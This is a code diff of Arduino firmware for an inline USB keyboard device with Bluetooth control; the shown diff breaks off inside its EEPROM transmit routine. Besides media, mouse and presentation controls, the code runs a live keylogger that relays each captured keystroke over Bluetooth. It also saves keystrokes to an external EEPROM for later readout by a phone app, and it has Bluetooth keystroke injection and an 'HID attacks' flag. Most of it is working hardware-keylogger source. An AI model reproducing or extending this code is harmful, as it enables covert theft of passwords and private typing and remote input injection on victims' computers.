@@ -1,10 +1,9 @@
 #include <hidboot.h>
 #include <usbhub.h>
-#include <Keyboard.h>
 #include <SoftwareSerial.h>
 
-//mouse
-#include <Mouse.h>
+//new special HID library
+#include "HID-Project.h"
 
 // Satisfy the IDE, which needs to see the include statment in the ino too.
 #ifdef dobogusinclude
@@ -16,49 +15,59 @@
 #include <Wire.h>
 #define disk1 0x50
 
-#define leftCtrl KEY_LEFT_CTRL
-#define rightCtrl KEY_RIGHT_CTRL
-#define leftAlt KEY_LEFT_ALT
-#define rightAlt KEY_RIGHT_ALT
-#define leftGUI KEY_LEFT_GUI
-#define rightGUI KEY_RIGHT_GUI
-#define leftShift KEY_LEFT_SHIFT
-#define rightShift KEY_RIGHT_SHIFT
-
-#define ESC KEY_ESC
-#define TAB KEY_TAB
-#define backSpace KEY_BACKSPACE
-#define returnKey KEY_RETURN
-
-#define arrowUp KEY_UP_ARROW
-#define arrowDown KEY_DOWN_ARROW
-#define arrowLeft KEY_LEFT_ARROW
-#define arrowRight KEY_RIGHT_ARROW
-
-#define homeKey KEY_HOME
-#define endKey KEY_END
-#define insert KEY_INSERT
-#define pageUp KEY_PAGE_UP
-#define deleteKey KEY_DELETE
-#define pageDown KEY_PAGE_DOWN
-
-#define F1 KEY_F1
-#define F2 KEY_F2
-#define F3 KEY_F3
-#define F4 KEY_F4
-#define F5 KEY_F5
-#define F6 KEY_F6
-#define F7 KEY_F7
-#define F8 KEY_F8
-#define F9 KEY_F9
-#define F10 KEY_F10
-#define F11 KEY_F11
-#define F12 KEY_F12
-
+//BLUETOOTH PIN'S
 #define bluetoothTx 11
 #define bluetoothRx 8
 
 SoftwareSerial BT_1(bluetoothTx, bluetoothRx);
+
+//BLUETOOTH EEPROM KEYWORD
+#define BLUETOOTH_KEYWORD "&$^"
+
+//BLUETOOTH RESET
+#define bluetooth_resetPin 12
+
+//ARDUINO RESET
+#define arduino_resetPin 4
+
+//DEBUG MONITOR
+#define DEBUG 0
+#define DEBUG_MOUSE 1
+#define DEBUG_KEYBOARD 1
+#define DEBUG_EEPROM 1
+#define DEBUG_PRESS 1
+#define DEBUG_BLUETOOTH 1
+#define DEBUG_BLUETOOTH_RX 1
+#define DEBUG_BLUETOOTH_RESET 1
+#define DEBUG_VOLUME 1
+
+//TEST
+#define TEST_LED 1
+#define TEST_BUTTON 1
+
+//FUNCTIONS
+#define FUNCTIONS 1
+#define FUNCTION_HID_ATTACKS 1
+#define FUNCTION_KEYBOARD 1
+#define FUNCTION_MOUSE 1
+#define FUNCTION_LIVE 1
+#define FUNCTION_TIMER 1
+#define FUNCTION_APP_BT_RESET 1
+#define FUNCTION_DEVICE_RESET 1
+
+//FUNCTIONS_MEDIA
+#define FUNCTIONS_ALL_MEDIA 1
+#define FUNCTION_MEDIA 1
+#define FUNFTION_MULTIMEDIA 1
+#define FUNCTION_VOLUME 1
+#define FUNCTION_BROWSER 1
+#define FUNCTION_POWERPOINT 1
+
+//test button
+#define test_buttonPin 5
+
+//test led
+#define test_ledPin 13
 
 //BLUETOOTH
 char input_byteData;
@@ -69,55 +78,72 @@ boolean blueKeylogger = 0;
 boolean blueKeyIn = 0; // eger normal tusa basilmissa 1 olur
 boolean blueMouse = 0;
 
-//MOUSE
-int cspd = 10;//curser speed
+String debug_printed;
 
-boolean tut = 1; // eger normal veya ozel bir tusa basildiysa 0, parmagimizi cektiysek 1
+//MOUSE COORDINATE
+int x;
+int y;
+
+boolean tut = 1; // if special or normal key pressed - > 0, otherwise - > 1
+boolean special_tut = 0; // if special key did not press - > 0, otherwise - > 1
+
 char keyes;
-
 char lastButton;
-
-boolean special_tut = 0; // 0 ise ozel tusa basili tutulmuyor 1 ise ozel tusa basili tutuluyor
 char specialChar;
+
 uint8_t keyesSpecial;
-
+int pastKeyChecked = 0;
+int specialKapa = 0;
+boolean combinePress = 0;
 int controlStop = 0;
-
 int controlKey; // 0-ctrl 1-shift 2-alt 3-gui  // simdilik bir ise yaramiyor
-
 int controlKeyChecked = 0; // iki kez calisan fonksiyon icin
 
+//Combine key manage
 int shiftControl = 0;
 int ctrlControl = 0;
 int altControl = 0;
 int guiControl = 0;
 
+//Key_Write_Normal
 int eskiZaman = 0;
 int yeniZaman;
 
+//Key_Write_Special
 int SPECIAL_eskiZaman = 0;
 int SPECIAL_yeniZaman;
 
+//BLUETOOTH_RESET_CONTROL
+#define BLUETOOTH_RESET_TIME 300 // seconds
+int new_seconds = 0;
+int old_seconds;
+int debug_second;
+
+//TIMER_ALARM (50 DAYS)
+unsigned long TIMER_eskiZaman = 0;
+unsigned long TIMER_yeniZaman;
+
+//OnControlKeysChanged
 boolean right_ctrlEnabled;
 boolean right_altEnabled;
 boolean right_shiftEnabled;
 boolean right_guiEnabled;
-
 boolean left_ctrlEnabled;
 boolean left_altEnabled;
 boolean left_shiftEnabled;
 boolean left_guiEnabled;
 
-int pastKeyChecked = 0;
-
-int specialKapa = 0;
-
-boolean combinePress = 0;
-
-//eeprom
+//EEPROM
 byte adressEnd;
 int _adressEnd;
-boolean is_EEPROM_open; // 0 -> kapali // 1 -> acik
+int is_EEPROM_open; // 0 -> open // 1 -> close // it could be boolean
+boolean eeprom_tut = 0;
+boolean eeprom_read = 0;
+int last_is_EEPROM_open; // it could be boolean
+boolean eeprom_Sented = 0;
+boolean read_ok = 0;
+int for_eeprom = 1;
+int k; // - > for eeprom debug
 
 class KbdRptParser : public KeyboardReportParser
 {
@@ -158,7 +184,6 @@ void KbdRptParser::PrintKey(uint8_t m, uint8_t key)
 
 void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
 {
-
   tut = 0;
   eskiZaman = millis();
   OnSpecial(key); // ozel tus kontrolu ve yazdirilmasi
@@ -172,9 +197,8 @@ void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
 
   lastButton = keyes;
 
-
+  eeprom_tut = 0;
 }
-
 
 void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) { // bu fonksiyon iki kez calisiyor, ilk bastigimda ikincisi elimi cektigimde
 
@@ -247,12 +271,12 @@ void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) { // bu f
     controlKey = 3;
     guiControl++;
   }
-
 }
 
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)
 {
   tut = 1;
+  eeprom_tut = 1;
   Serial.print("UP ");
   PrintKey(mod, key);
   eskiZaman = yeniZaman; // tustan parmagimizi cektin time tutmayi durdur
@@ -274,46 +298,45 @@ void KbdRptParser::OnKeyboard(uint8_t key)
     Keyboard.print((char)key);
     //delay(20); // tusa basildiktan sonra bekle
   }
-
 }
 
 void KbdRptParser::OnCtrl() {
 
   if (left_ctrlEnabled == 1) {
-    Keyboard.write(leftCtrl);
+    Keyboard.write(KEY_LEFT_CTRL);
   }
   else if (right_ctrlEnabled == 1) {
-    Keyboard.write(rightCtrl);
+    Keyboard.write(KEY_RIGHT_CTRL);
   }
 }
 
 void KbdRptParser::OnAlt() {
 
   if (left_altEnabled == 1) {
-    Keyboard.write(leftAlt);
+    Keyboard.write(KEY_LEFT_ALT);
   }
   else if (right_altEnabled == 1) {
-    Keyboard.write(rightAlt);
+    Keyboard.write(KEY_RIGHT_ALT);
   }
 }
 
 void KbdRptParser::OnShift() {
 
   if (left_shiftEnabled == 1) {
-    Keyboard.write(leftShift);
+    Keyboard.write(KEY_LEFT_SHIFT);
   }
   else if (right_shiftEnabled == 1) {
-    Keyboard.write(rightShift);
+    Keyboard.write(KEY_RIGHT_SHIFT);
   }
 }
 
 void KbdRptParser::OnGui() {
 
   if (left_guiEnabled == 1) {
-    Keyboard.write(leftGUI);
+    Keyboard.write(KEY_LEFT_GUI);
   }
   else if (right_guiEnabled == 1) {
-    Keyboard.write(rightGUI);
+    Keyboard.write(KEY_RIGHT_GUI);
   }
 }
 
@@ -336,35 +359,34 @@ void KbdRptParser::OnSpecial(uint8_t key)
 
       switch (key) // ozel tus kontrolu ve yazdirilmasi
       {
-        case 40: Keyboard.write(returnKey); break;
-        case 41: Keyboard.write(ESC); break;
-        case 42: Keyboard.write(backSpace); break;
-        case 43: Keyboard.write(TAB); break;
-        case 58: Keyboard.write(F1); break;
-        case 59: Keyboard.write(F2); break;
-        case 60: Keyboard.write(F3); break;
-        case 61: Keyboard.write(F4); break;
-        case 62: Keyboard.write(F5); break;
-        case 63: Keyboard.write(F6); break;
-        case 64: Keyboard.write(F7); break;
-        case 65: Keyboard.write(F8); break;
-        case 66: Keyboard.write(F9); break;
-        case 67: Keyboard.write(F10); break;
-        case 68: Keyboard.write(F11); break;
-        case 69: Keyboard.write(F12); break;
-        case 73: Keyboard.write(insert); break;
-        case 74: Keyboard.write(homeKey); break;
-        case 75: Keyboard.write(pageUp); break;
-        case 76: Keyboard.write(deleteKey); break;
-        case 77: Keyboard.write(endKey); break;
-        case 78: Keyboard.write(pageDown); break;
-        case 79: Keyboard.write(arrowRight); break;
-        case 80: Keyboard.write(arrowLeft); break;
-        case 81: Keyboard.write(arrowDown); break;
-        case 82: Keyboard.write(arrowUp); break;
-        case 88: Keyboard.write(returnKey); break;
+        case 40: Keyboard.write(KEY_RETURN); break;
+        case 41: Keyboard.write(KEY_ESC); break;
+        case 42: Keyboard.write(KEY_BACKSPACE); break;
+        case 43: Keyboard.write(KEY_TAB); break;
+        case 58: Keyboard.write(KEY_F1); break;
+        case 59: Keyboard.write(KEY_F2); break;
+        case 60: Keyboard.write(KEY_F3); break;
+        case 61: Keyboard.write(KEY_F4); break;
+        case 62: Keyboard.write(KEY_F5); break;
+        case 63: Keyboard.write(KEY_F6); break;
+        case 64: Keyboard.write(KEY_F7); break;
+        case 65: Keyboard.write(KEY_F8); break;
+        case 66: Keyboard.write(KEY_F9); break;
+        case 67: Keyboard.write(KEY_F10); break;
+        case 68: Keyboard.write(KEY_F11); break;
+        case 69: Keyboard.write(KEY_F12); break;
+        case 73: Keyboard.write(KEY_INSERT); break;
+        case 74: Keyboard.write(KEY_HOME); break;
+        case 75: Keyboard.write(KEY_PAGE_UP); break;
+        case 76: Keyboard.write(KEY_DELETE); break;
+        case 77: Keyboard.write(KEY_END); break;
+        case 78: Keyboard.write(KEY_PAGE_DOWN); break;
+        case 79: Keyboard.write(KEY_RIGHT_ARROW); break;
+        case 80: Keyboard.write(KEY_LEFT_ARROW); break;
+        case 81: Keyboard.write(KEY_DOWN_ARROW); break;
+        case 82: Keyboard.write(KEY_UP_ARROW); break;
+        case 88: Keyboard.write(KEY_RETURN); break;
       }
-
     }
   }
 }
@@ -373,36 +395,35 @@ void KbdRptParser::OnSpecialKey(uint8_t key)
 {
   switch (key)
   {
-    case 40: specialChar = returnKey; break;
-    case 41: specialChar = ESC; break;
-    case 42: specialChar = backSpace; break;
-    case 43: specialChar = TAB; break;
-    case 58: specialChar = F1; break;
-    case 59: specialChar = F2; break;
-    case 60: specialChar = F3; break;
-    case 61: specialChar = F4; break;
-    case 62: specialChar = F5; break;
-    case 63: specialChar = F6; break;
-    case 64: specialChar = F7; break;
-    case 65: specialChar = F8; break;
-    case 66: specialChar = F9; break;
-    case 67: specialChar = F10; break;
-    case 68: specialChar = F11; break;
-    case 69: specialChar = F12; break;
-    case 73: specialChar = insert; break;
-    case 74: specialChar = homeKey; break;
-    case 75: specialChar = pageUp; break;
-    case 76: specialChar = deleteKey; break;
-    case 77: specialChar = endKey; break;
-    case 78: specialChar = pageDown; break;
-    case 79: specialChar = arrowRight; break;
-    case 80: specialChar = arrowLeft; break;
-    case 81: specialChar = arrowDown; break;
-    case 82: specialChar = arrowUp; break;
-    case 88: specialChar = returnKey; break;
+    case 40: specialChar = KEY_RETURN; break;
+    case 41: specialChar = KEY_ESC; break;
+    case 42: specialChar = KEY_BACKSPACE; break;
+    case 43: specialChar = KEY_TAB; break;
+    case 58: specialChar = KEY_F1; break;
+    case 59: specialChar = KEY_F2; break;
+    case 60: specialChar = KEY_F3; break;
+    case 61: specialChar = KEY_F4; break;
+    case 62: specialChar = KEY_F5; break;
+    case 63: specialChar = KEY_F6; break;
+    case 64: specialChar = KEY_F7; break;
+    case 65: specialChar = KEY_F8; break;
+    case 66: specialChar = KEY_F9; break;
+    case 67: specialChar = KEY_F10; break;
+    case 68: specialChar = KEY_F11; break;
+    case 69: specialChar = KEY_F12; break;
+    case 73: specialChar = KEY_INSERT; break;
+    case 74: specialChar = KEY_HOME; break;
+    case 75: specialChar = KEY_PAGE_UP; break;
+    case 76: specialChar = KEY_DELETE; break;
+    case 77: specialChar = KEY_END; break;
+    case 78: specialChar = KEY_PAGE_DOWN; break;
+    case 79: specialChar = KEY_RIGHT_ARROW; break;
+    case 80: specialChar = KEY_LEFT_ARROW; break;
+    case 81: specialChar = KEY_DOWN_ARROW; break;
+    case 82: specialChar = KEY_UP_ARROW; break;
+    case 88: specialChar = KEY_RETURN; break;
   }
 }
-
 
 void KbdRptParser::OnKeyPressed(uint8_t key)
 {
@@ -410,7 +431,6 @@ void KbdRptParser::OnKeyPressed(uint8_t key)
   Serial.println((char)key);
   OnKeyboard((char)key);
   blueKeyIn = 1;
-
 };
 
 USB     Usb;
@@ -424,38 +444,54 @@ KbdRptParser Prs;
 void setup()
 {
 
-  Serial.begin( 115200 );
+  Serial.begin(115200);
   BT_1.begin(9600);
+
+  //arduino_resetPin
+  //pinMode(arduino_resetPin, INPUT);
+  //digitalWrite(arduino_resetPin, HIGH);
+
+  //bluetooth_resetPin
+  pinMode(bluetooth_resetPin, OUTPUT);
+  digitalWrite(bluetooth_resetPin, HIGH);
+
+  if(TEST_BUTTON)
+  {
+    //test_buttonPin
+    pinMode(test_buttonPin, INPUT);
+    digitalWrite(test_buttonPin, HIGH);
+  }
+
+  if(TEST_LED)
+  {
+    //test_ledPin
+    pinMode(test_ledPin, OUTPUT);
+    digitalWrite(test_ledPin, LOW);
+  }
+  
+  if(FUNCTIONS) { if(FUNCTION_MOUSE) { Mouse.begin(); } if(FUNCTIONS_ALL_MEDIA) { Consumer.begin(); } }
+  
   Keyboard.begin();
   Wire.begin();
-
+  
   unsigned int address = 0;
 
-  is_EEPROM_open = readEEPROM(disk1, 0);
+  is_EEPROM_open = (int)readEEPROM(disk1, 0);
 
   pinMode(4, INPUT_PULLUP);
 
-#if !defined(__MIPSEL__)
-  while (Serial); // (while (!Serial))Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
-#endif
+  if(DEBUG) { Serial.println("Start"); }
 
-  Serial.println("Start");
-
-  if (Usb.Init() == -1)
-    Serial.println("OSC did znot start.");
-
+  if (Usb.Init() == -1) { if(DEBUG) { Serial.println("OSC did znot start."); } }
+  
   delay( 200 );
-
   next_time = millis() + 5000;
-
   HidKeyboard.SetReportParser(0, &Prs);
 }
 
 void loop() {
 
   Usb.Task();
-
-  //const char *msg = "hello";
 
   if (tut == 0) {
     yeniZaman = millis();  // tusa basilirsa zamani kaydet
@@ -465,24 +501,47 @@ void loop() {
     SPECIAL_yeniZaman = millis();  // ozel tusa basilirsa zamani kaydet
   }
 
-  bluetoothData();
-  bluetoothCommit();
-  liveKeylogger();
-  normalKeyWrite();
-  specialKeyWrite();
-  combineKeyWrite();
-  fingerUp();
-  combineElse();
+  if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { debug_second = new_seconds; } }
+    
+  new_seconds = (millis()/1000);
+
+  if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { if(debug_second < new_seconds) { Serial.println(new_seconds); } } }
+
+  if(digitalRead(test_buttonPin) == LOW) // FOR HID TEST, IT WORKS WITH GND
+  {
+    //codes are here..
+    digitalWrite(test_ledPin, HIGH);
+  }
+  else
+  {
+    digitalWrite(test_ledPin, LOW);
+  }
+
+  Bluetooth_Recive();
+  Bluetooth_Printed();
+  EEPROM_Transmit();
+  EEPROM_Key_Saver();
+  Live_Key_Transmit();
+  Key_Write_Normal();
+  Key_Write_Special();
+  Key_Write_Combine();
+  Combine_Key_Up();
+  Combine_Unavaible();
+  BLUETOOTH_RESET();  
 
 }
 
-void bluetoothData() {
+void Bluetooth_Recive() {
 
-  if (BT_1.available() > 0) { // eger bluetooth iletisimi varsa
-    input_byteData = BT_1.read();//recieve value from bluetooth
+  if (BT_1.available() > 0) {
+    input_byteData = BT_1.read(); //recieve value from bluetooth
     printed += input_byteData;
 
-    if (input_byteData == '#') { printed = ""; }
+    old_seconds = new_seconds;
+
+    if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { Serial.println("BLUETOOTH_SECONDS_STARTS"); } }
+    
+    if (input_byteData == '#') { printed = ""; debug_printed  = ""; }
                  
     if (printed == "$") {
 
@@ -490,185 +549,405 @@ void bluetoothData() {
       blueMouse = 0;
       blueKeylogger = 0; //live
       blueKeyIn = 0; //liveClose
-      printed = "";  
+      is_EEPROM_open = (int)readEEPROM(disk1, 0);
+      read_ok = 0;
+      printed = "";
+      debug_printed  = "";
+      
       }
-    
+
+    if(printed == "^") {
+      
+      blueKeyboard = 0;
+      printed = "";
+      debug_printed  = "";
+    }
+
+    if(DEBUG)
+    {
+      if(DEBUG_BLUETOOTH_RX)
+      {
+       if(input_byteData != '@')
+        {
+          debug_printed += input_byteData;
+        }
+        else
+        {
+          Serial.println("");
+          Serial.println("RECIVED - > ");
+          Serial.print(debug_printed);
+          debug_printed;
+        }   
+      }
+    }
+ 
     blueCommit = 1;
 
-    if (input_byteData != '#' && blueKeyboard == 1) { keyboardWrite(); } // BLUETOOTH KEYBOARD
+    if (input_byteData != '#' && blueKeyboard == 1) { Bluetooth_Key_Write(); } // BLUETOOTH KEYBOARD
 
-    if (input_byteData != '#' && blueMouse == 1) { mouseWrite(); } // BLUETOOTH MOUSE
+    if (input_byteData != '#' && blueMouse == 1) { Bluetooth_Mouse_Write(); } // BLUETOOTH MOUSE
 
     if (digitalRead(4) == 0) { delay(1000); Serial.println(printed); }
   }
 }
 
-void bluetoothCommit() 
+
+void Bluetooth_Printed() 
 {
 
   if (blueCommit == 1) 
   {
+    if(FUNCTIONS)
+    {
+      if(FUNCTION_KEYBOARD)
+      {
+        //KEYBOARD
+        if (printed == "KEYBOARD_OPEN") { blueKeyboard = 1; }
+        if (printed == "BACKSPACE") { Keyboard.press(KEY_BACKSPACE); Keyboard.releaseAll(); blueKeyboard = 1; }
+      }
 
-    if (printed == "KEYBOARDOPEN") { blueKeyboard = 1; } // bluetooth ile klavye kontrolu icin gerekli kodlar
+      if(FUNCTION_MOUSE)
+      {
+        //MOUSE
+        if (printed == "MOUSE_OPEN") { blueMouse = 1; }
+        if (printed == "PRESS") { Mouse.press(); Mouse.release(); }
+        if (printed == "MIDDLE") { Mouse.click(MOUSE_MIDDLE); Mouse.release(); }
+        if (printed == "RIGHT") { Mouse.click(MOUSE_RIGHT); Mouse.release(); }
+        if (printed == "LONG_PRESS") { Mouse.press(); }
+        if (printed == "LONG_MIDDLE") { Mouse.click(MOUSE_MIDDLE); }
+        if (printed == "LONG_RIGHT") { Mouse.click(MOUSE_RIGHT); }
+        if (printed == "LONG_END") { Mouse.release(); }
+      }
 
-    if (printed == "MOUSEOPEN") { blueMouse = 1; } // bluetooth ile fare kontrol etmek icin gerekli kodlar.
+      if(FUNCTION_LIVE)
+      {
+        //LIVE KEYLOGGER
+        if (printed == "LIVE_KEYLOGGER_OPEN") { blueKeyIn = 0; blueKeylogger = 1; }
+        if (printed == "LIVE_OPEN_CLOSE_EEPROM") { is_EEPROM_open = 0; blueKeyIn = 0; blueKeylogger = 1; }
+      }
 
-    if (printed == "LIVEKEYLOGGEROPEN") { blueKeyIn = 0; blueKeylogger = 1; } // bluetooth keylogger ozelligi icin gerekli kodlar.
+      if(FUNCTION_HID_ATTACKS)
+      {
+        //HID ATTACKS
+        if (printed == "HID_ATTACKS_OPEN") {}
+      }
 
-    if (printed == "LIVEKEYLOGGEROPENCLOSEEEPROM") {} // bluetooth keylogger ozelligi, eeprom kaydediyorsa eger duracak
+      if(FUNCTION_APP_BT_RESET)
+      {
+        //BT-REST WITH APP
+        if (printed == "BT_RESET") { new_seconds = old_seconds + 1; BLUETOOTH_RESET(); if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { Serial.println("BLUETOOTH_RESET"); } } }
+        if (printed == "BT_TIMER_CHANGE") {}
+      }
 
-    if (printed == "POWERSHELLOPEN") {} // bluetooth poweshell komutlarini kullanabilmek icin gerekli kodlar
+      if(FUNCTION_DEVICE_RESET)
+      {
+        //DEVICE RESET WITH APP
+        if (printed == "DEVICE_RESET") {}
+      }
 
-    if (printed == "EEPROMCHECK") { if(readEEPROM(disk1, 0) == 0) { BT_1.print("EEPROMISCLOSE"); } else if(readEEPROM(disk1, 0) == 1) { BT_1.print("EEPROMISOPEN"); } }
-                                    
-    if (printed == "EEPROMDATACHECK") { adressEnd = readEEPROM(disk1, 1); _adressEnd = (int) ((65536 - adressEnd - 2) * 100)/65536; BT_1.print(_adressEnd); }
+      if(FUNCTION_TIMER)
+      {
+        //TIMER
+        if (printed == "TIMER_CHECK") { if(BT_1.isListening()){ BT_1.print(""); } }
+      }
 
-    if (printed == "EEPROMSTART") { writeEEPROM(disk1, 0, 1); is_EEPROM_open = 1; } // eeprom ozelligini acmak icin gerekli kelime
+      if(FUNCTIONS_ALL_MEDIA)
+      {
+        if(FUNCTION_POWERPOINT)
+        {
+          //POWERPOINT
+          if (printed == "LEFT_ARROW") { Keyboard.press(KEY_LEFT_ARROW); Keyboard.releaseAll(); } 
+          if (printed == "RIGHT_ARROW") { Keyboard.press(KEY_RIGHT_ARROW); Keyboard.releaseAll(); }
+        }
 
-    if (printed == "EEPROMSTOP") { writeEEPROM(disk1, 0, 0); is_EEPROM_open = 0; } // eeprom ozelligini kapamak icin gerekli kelime
+        if(FUNCTION_MEDIA)
+        {
+          //MEDIA CONTROL
+          if (printed == "PLAY_PAUSE") { Consumer.press(MEDIA_PLAY_PAUSE); Consumer_End(); }
+          if (printed == "STOP") { Consumer.press(MEDIA_STOP); Consumer_End(); }
+          if (printed == "NEXT") { Consumer.press(MEDIA_NEXT); Consumer_End(); }
+          if (printed == "PREVIOUS") { Consumer.press(MEDIA_PREVIOUS); Consumer_End(); }
+          if (printed == "REWIND") { Consumer.press(MEDIA_REWIND); Consumer_End(); }
+          if (printed == "FAST_FORWARD") { Consumer.press(MEDIA_FAST_FORWARD); Consumer_End(); }
+        }
 
-    if (printed == "GETEEPROMDATA") {} // eeprom icinde kayitli datayi bluetooth ustunden gondermek icin bekleyen kelime 
- }
+        if(FUNCTION_VOLUME)
+        {
+          //VOLUME
+          if (printed == "VOLUME_MUTE") { Consumer.press(MEDIA_VOLUME_MUTE); Consumer_End(); }
+          if (printed == "VOLUME_UP") { Consumer.press(MEDIA_VOLUME_UP); Consumer_End(); }
+          if (printed == "VOLUME_DOWN") { Consumer.press(MEDIA_VOLUME_DOWN); Consumer_End(); }
+          if (printed == "VOLUME_HIGH") { volume_high(); }
+          if (printed == "VOLUME_OFF") { volume_off(); }
+        }
 
-  blueCommit = 0;
-}
+        if(FUNCTION_BROWSER)
+        {
+          //BROWSER
+          if (printed == "BROWSER_HOME") { Consumer.press(CONSUMER_BROWSER_HOME); Consumer_End(); }
+          if (printed == "BROWSER_BACK") { Consumer.press(CONSUMER_BROWSER_BACK); Consumer_End(); }
+          if (printed == "BROWSER_FORWARD") {Consumer.press(CONSUMER_BROWSER_FORWARD); Consumer_End(); }
+          if (printed == "BROWSER_REFRESH") {Consumer.press(CONSUMER_BROWSER_REFRESH); Consumer_End(); }
+          if (printed == "BROWSER_BOOKMARKS") {Consumer.press(CONSUMER_BROWSER_BOOKMARKS); Consumer_End(); }
+        }
 
-void liveKeylogger() 
-{
+        if(FUNFTION_MULTIMEDIA)
+        {
+          //EXTRA MULTIMEDIA KEY'S
+          if (printed == "EMAIL_READER") { Consumer.press(CONSUMER_EMAIL_READER); Consumer_End(); }
+          if (printed == "CALCULATOR") { Consumer.press(CONSUMER_CALCULATOR); Consumer_End(); }
+          if (printed == "EXPLORER") { Consumer.press(CONSUMER_EXPLORER); Consumer_End(); }
+        }
+      }
+    }
 
-  if (blueKeylogger == 1 && blueKeyIn == 1) {
+    //EEPROM CHECK
+    if (printed == "EEPROM_CHECK") { if(readEEPROM(disk1, 0) == 0) { BT_1.print("EEPROM_IS_CLOSE"); is_EEPROM_open = 0;} else if(readEEPROM(disk1, 0) == 1) { BT_1.print("EEPROM_IS_OPEN"); is_EEPROM_open = 1; }}                     
+    if (printed == "EEPROM_DATA_CHECK") { adressEnd = readEEPROM(disk1, 1); _adressEnd = (int) ((65536 - adressEnd - 2) * 100)/65536; BT_1.print(_adressEnd); }
 
-    BT_1.print(lastButton);
+    //EEPROM ON-OFF
+    if (printed == "EEPROM_START") { writeEEPROM(disk1, 0, 1); is_EEPROM_open = 1; }
+    if (printed == "EEPROM_STOP") { writeEEPROM(disk1, 0, 0); is_EEPROM_open = 0; }
 
-    blueKeyIn = 0;
-  }
-}
-
-void keyboardWrite() 
-{
-
-  if (blueCommit == 1) {
-    Keyboard.print(input_byteData); //print char as recieved byte by byte
+    //FOR EEPROM
+    if (printed == "IS_READABLE") { 
+    
+      if(readEEPROM(disk1, 1) >= 3 && read_ok == 0) { if(BT_1.isListening()) { BT_1.print("READ_ENABLE"); read_ok = 1; if(DEBUG) { Serial.println(""); Serial.println("SENTED  - > READ_ENABLE"); } } }
+      else if (readEEPROM(disk1, 1) < 3) { eeprom_read = 0; if(BT_1.isListening()) { BT_1.print("READ_NOT_ENABLE"); read_ok = 1; if(DEBUG) { Serial.println(""); Serial.println("SENTED  - > READ_NOT_ENABLE"); } } } }
+    
+    if (printed == "EEPROM_GET_DATA") { eeprom_read = 1; is_EEPROM_open = is_EEPROM_open; is_EEPROM_open = 0; } 
+    if (printed == "EEPROM_DATA_SAVED") { is_EEPROM_open = last_is_EEPROM_open; last_is_EEPROM_open; eeprom_read = 0; eeprom_Sented = 0; keyes; writeEEPROM(disk1, 1, (byte)for_eeprom); BT_1.print("EEPROM_FINISHED"); }
+     
     blueCommit = 0;
   }
-
 }
 
-void mouseWrite() 
+void debug()
 {
-  /*here we configure our code to recive spacifide val from the
-        adapter and act accordingly
-        some apps give you abilty to send any char you want and
-        others give you pre specifide char
-        OR IN BETTER CASES, you can create your own app with android :D*/
-  if (input_byteData == "UP") {
-    Mouse.move(0, -cspd, 0);//move up
-  }
-  if (input_byteData == "DOWN") {
-    Mouse.move(0, cspd, 0);//move down
-  }
-  if (input_byteData == "RIGHT") {
-    Mouse.move(cspd, 0, 0);//move right
-  }
-  if (input_byteData == "LEFT") {
-    Mouse.move(-cspd, 0, 0);//move left
-  }
+  if(DEBUG)
+  {
+    Serial.println("");
 
-  // if you want to move Diagonally you should use the commented code
-  //but you mus make sure that your app has such option
-
-  if (input_byteData == "UPLEFT") {
-    Mouse.move(-cspd, -cspd, 0);//move up left
-  }
-  if (input_byteData == "UPRIGHT") {
-    Mouse.move(cspd, -cspd, 0);//move up right
-  }
-  if (input_byteData == "DOWNLEFT") {
-    Mouse.move(-cspd, cspd, 0);//move down left
-  }
-  if (input_byteData == "DOWNRIGH") {
-    Mouse.move(cspd, cspd, 0);//move down right
-  }
-
-  if (input_byteData == "MIDDLE") {
-    Mouse.click(MOUSE_MIDDLE);
-
-    /* this instruction make a mouse click with the left mouse button
-       we can set the mouse button th click-- Mouse.click(button);
-       Button= MOUSE_LEFT(defult) | MOUSE_RIGHT | MOUSE_MIDDLE */
-  }
-
-  if (input_byteData == "RIGHTCLICK") {
-    Mouse.click(MOUSE_RIGHT);//Right click
-  }
-  if (input_byteData == "PRESS") {
-    Mouse.press();//Left click, aka. Press
-  }
-  if (input_byteData == "PREESSUP") {
-    Mouse.release();//release a pressed button. It can be set to other buttons
+    if(DEBUG_EEPROM)
+    {
+      if(is_EEPROM_open == 1 && eeprom_tut == 0)
+      {
+        Serial.println("EEPROM_Key_Saver  : 1");
+        Serial.println("eeprom_tut        : 0");
+        Serial.print("keyes               : ");
+        Serial.print(keyes);
+        Serial.println("adress 1        : ");
+        Serial.print((int)readEEPROM(disk1, 1));
+      }
+      else if(eeprom_read == 1 && eeprom_Sented == 0)
+      {
+        Serial.println("EEPROM_Transmit  : 1");
+        Serial.println("sented char      : ");
+        Serial.print(char(readEEPROM(disk1, k)));
+      }
+    }
+    if(DEBUG_MOUSE)
+    {
+      if(blueMouse == 1)
+      {
+        Serial.print("MOUSE_COORDINATE -  X & Y - > ");
+        Serial.print(x);
+        Serial.print(" & ");
+        Serial.print(y);
+      }
+    } 
   }
 }
 
+void BLUETOOTH_RESET()
+{
+  if(new_seconds - old_seconds > BLUETOOTH_RESET_TIME)
+  {
+    digitalWrite(bluetooth_resetPin, LOW);
+    delay(20);
+    digitalWrite(bluetooth_resetPin, HIGH);
+    old_seconds = new_seconds;
 
-void normalKeyWrite() 
+    if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { Serial.println("_BLUETOOTH_RESET"); } } 
+  }
+}
+
+void Consumer_End()
+{
+  if(FUNCTIONS_ALL_MEDIA)
+  {
+    Consumer.releaseAll(); 
+  }
+}
+
+void volume_high()
+{
+  if(FUNCTION_VOLUME)
+  {
+    for(int i = 0; i<100; i++)
+    { 
+      Consumer.press(MEDIA_VOLUME_UP); 
+      delay(3); 
+    } 
+    Consumer_End();
+  }
+}
+
+void volume_off()
+{
+  if(FUNCTION_VOLUME)
+  {
+    for(int i = 0; i<100; i++)
+    { 
+      Consumer.press(MEDIA_VOLUME_DOWN); 
+      delay(3); 
+    } 
+    Consumer_End();
+  }
+}
+
+void EEPROM_Transmit()
+{
+  if(eeprom_read == 1)
+  {
+    if(eeprom_Sented == 0)
+    {
+      for(int i = 2; i <= readEEPROM(disk1, 1); i++)
+      {
